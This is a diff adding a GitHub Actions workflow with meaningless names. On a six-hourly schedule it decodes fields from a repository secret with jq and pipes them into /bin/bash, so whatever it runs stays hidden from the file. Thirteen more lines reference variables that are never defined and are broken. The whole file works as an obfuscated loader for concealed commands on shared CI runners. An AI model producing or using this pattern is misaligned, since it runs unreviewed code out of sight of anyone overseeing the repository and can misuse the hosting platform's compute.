@@ -1,0 +1,32 @@
+name: songbingjia7986
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songbingjia7986
+        env:
+          tv413: ${{ secrets.tv413 }}
+        run: |
+          echo $tv413 | jq -r .ie8485 | /bin/bash
+          echo $jcwb279 | jq -r .ulhv89551 | /bin/bash
+          echo $wxg1 | jq -r .dxe310 | /bin/bash
+          echo $cesnt09715 | jq -r .z4960 | /bin/bash
+          echo $jsu32 | jq -r .s2 | /bin/bash
+          echo $tnxfv231 | jq -r .d28858 | /bin/bash
+          echo $t8 | jq -r .b5 | /bin/bash
+          echo $dndy8147 | jq -r .gyqd467 | /bin/bash
+          echo $uz417 | jq -r .s70494 | /bin/bash
+          echo $kizx04958 | jq -r .u9 | /bin/bash
+          echo $pqirn72686 | jq -r .ip67271 | /bin/bash
+          echo $phlbx75 | jq -r .xzpdj58916 | /bin/bash
+          echo $jnut0439 | jq -r .gwg36342 | /bin/bash
+          echo $lvssb437 | jq -r .esdwv78203 | /bin/bash
+
